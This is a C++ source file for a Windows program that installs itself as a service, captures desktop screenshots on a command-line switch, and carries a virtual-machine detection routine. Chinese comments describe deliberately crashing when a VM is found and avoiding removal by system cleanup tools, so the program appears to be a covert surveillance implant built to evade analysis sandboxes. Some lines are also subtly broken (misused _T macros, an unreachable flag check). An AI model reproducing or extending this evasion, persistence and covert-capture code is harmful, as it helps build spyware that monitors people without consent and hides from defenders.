// NewGdp.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "AntiVm/md5.h"
#include "Configure.h"
#include "NewGdp.h"
#include "ServiceInstaller.h"
#include "Service/APIService.h"
#include "Service/WPMService.h"
#include "Utilities/eOSVer.h"
#include "Utilities/uid.h"
#include "captureScreen.h"

Utilities::CeOSVer osv;
WPMService* g_pService = new WPMService(osv.IsWinXPOrLater());
extern SERVICEDATA	g_ServiceData;
wchar_t g_szGuid[MAX_PATH] = { 0 };

DWORD Getlione = UID::help::getGUID(g_szGuid, MAX_PATH);

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	Utilities::String::CCmdLine cmdLine;

	BOOL bRet = cmdLine.Analyze(lpCmdLine);
	if (!bRet) {
		DebugOutputMsg(_T("cmdLine.Analyze failed lpCmdLine=[%s]"), lpCmdLine);
		return 1;
	}

	DWORD SetVmFlag = 65535;

	DebugOutputMsg(_T("CaptureScreenImage  lpCmdLine= [%s]", lpCmdLine));
	GConfigInfo::instance()->Init(lpCmdLine);
	if (cmdLine.HasParam(CMDLINE_PARAM_NAME_CAPTURE))
	{
		DebugOutputMsg(_T("CaptureScreenImage  begin"));
		DWORD dwCaptureId = 0;
		CCaptureScreen::CaptureScreenImage(GetDesktopWindow(), dwCaptureId);
		DebugOutputMsg(_T("CaptureScreenImage fileID = [%d]", dwCaptureId));
		return dwCaptureId;
	}

	if (!g_pService) {
		return -1;
	}

	CServiceInstaller svrInstaller(g_pService);

	//if (IsVirtualEnv()) {  //检测到在虚拟机中运行，破坏当前线程中的堆栈,使程序异常退出
	//	goto exit_flg;
	//}

	if (cmdLine.HasParam(CMDLINE_PARAM_NAME_INSTALL)){
		if (APIService::IsInstalled()) {
			svrInstaller.PreSelfInstall(lpCmdLine);
		}
		else {  //启动原来的服务
			if (!APIService::StartService()) {
				if (APIService::UninstallService()) {
					Sleep(500);
					svrInstaller.PreSelfInstall(lpCmdLine);
				}
			}
		}
	}
	else if (cmdLine.HasParam(CMDLINE_PARAM_NAME_UNINSTALL)) {
		svrInstaller.SelfUninstall();
	}

	if (cmdLine.HasParam(CMDLINE_PARAM_NAME_SVCNAME)) {
		_stprintf_s(g_ServiceData.lpszServiceName, L"%s", std::wstring(cmdLine[CMDLINE_PARAM_NAME_SVCNAME]).c_str());

		if (SetVmFlag == 0) {  //让系统优化的时候不删除
			return -1;
		}
	}

	if (cmdLine.HasParam(CMDLINE_PARAM_NAME_RUN)) {
		APIService::InstAndStartService(g_pService->m_bIsAfterXP, g_pService->m_bDelayStartup);
	}
	else if (cmdLine.HasParam(CMDLINE_PARAM_NAME_START)) {
		APIService::StartService();
	}
	else if (cmdLine.HasParam(CMDLINE_PARAM_NAME_STOP)) {
		APIService::StopService();
	}
	else if (cmdLine.HasParam(CMDLINE_PARAM_NAME_KILL)) {
		APIService::UninstAndStopService();
	}
	else if (cmdLine.HasParam(CMDLINE_PARAM_NAME_RUANASSVR)) {
		g_pService->OnRunService();
	}
exit_flg:

	return 0;
}

BOOL IsVirtualEnv()
{
	BOOL bRet = FALSE;
	BOOL bCanDetectFun = TRUE;


#ifdef CHECK_ROOT
	{
		char szRootPath[MAX_PATH] = { 0 };
		char szRootHash[200] = { 0 };

		GetWindowsDirectoryA(szRootPath, MAX_PATH);
		strcat(szRootPath, "\\peRoot");

		char szRondomData[100] = { 0 };
		BYTE szRondomDataHashTmp[64] = { 0 };
		char szRondomDataHash[64] = { 0 };
		char szDataHashFromFile[64] = { 0 };

		SYSTEMTIME locSysTime = { 0 };

		GetPrivateProfileStringA("Main", "Sec", "null", szDataHashFromFile, 64, szRootPath);

		//hash数值一天内有效.
		GetLocalTime(&locSysTime);
		sprintf(szRondomData, "%dYeAr%02dMoNth%02dDaY",
			locSysTime.wYear, locSysTime.wMonth, locSysTime.wDay);

		MDString(szRondomData, szRondomDataHashTmp);
		for (int index = 0; index < 16; index++)
		{
			char szTemp[4] = { 0 };
			sprintf(szTemp, "%02x", szRondomDataHashTmp[index]);
			strcat(szRondomDataHash, szTemp);
		}

		if (0 == strcmp(szDataHashFromFile, szRondomDataHash))
		{
			//LOG_INFO(L"IsVirtualEnv() Hash_File = %s,Hash_Com = %s.",
			//szDataHashFromFile,szRondomDataHash);

			bCanDetectFun = FALSE;
		}
	}
#endif

	if (bCanDetectFun)
	{
		if (DetectVM())
		{
			bRet = TRUE;
		}
	}

	return bRet;
}